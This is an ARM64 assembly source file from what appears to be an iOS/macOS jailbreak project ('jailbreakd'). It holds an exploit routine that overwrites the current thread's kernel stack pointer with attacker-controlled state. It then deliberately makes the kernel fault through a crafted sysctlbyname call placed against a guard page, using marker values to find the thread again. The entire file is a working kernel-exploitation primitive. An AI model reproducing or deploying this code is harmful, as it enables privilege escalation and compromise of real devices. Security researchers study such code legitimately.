//
//  asm.S
//  jailbreakd - asmAndC
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

.text
.align 4

/*
 * x21: threadStructMapped - a mapping of the struct thread of this current thread
 * x22: targetState - the user state that we want to set as our current thread's fake kernel stack pointer
 * x23: createExploitMem() - 0x10 bytes above a guard page
 * x24: offsets.threadStruct.kStackPtrOffset
 */
.globl _doMagic
_doMagic:
    ldr x0, =0x4949494949494949
    str x0, [x23]
    str x0, [x23,#0x8] /* fill all 10 remaining bytes with 'I' */

    str x22, [x21,x24] /* sets this thread's kernel stack pointer to targetState */
    mov x0, x23
    add x0, x0, 0xC /* const char *name - 4 bytes of "IIII", then a guard page which will make kernel fault */
    mov x1, 0x6 /* size_t namelen */
    mov x2, x23 /* void* old */
    mov x3, x23 /* void* oldlenp - 0x49494949_49494949 bytes - not sure if this is used? */
    mov x4, 0 /* void* new */
    mov x5, 0 /* void* newlen */
    ldr s1, =0x42424242 /* for finding this thread again in calculateThreadStateAdjust */
    ldr s2, =0x43434343
    ldr s3, =0x44444444
    ldr s4, =0x45454545
    mov x16, #274 /* sys_sysctlbyname(const char *name, size_t namelen, void *old, size_t *oldlenp, void *new, size_t newlen) */
    svc #0x80
doMagicLoop:
    b doMagicLoop

.globl _userReturn
_userReturn:
    ldr x23, =0x12345678
    b _userReturn
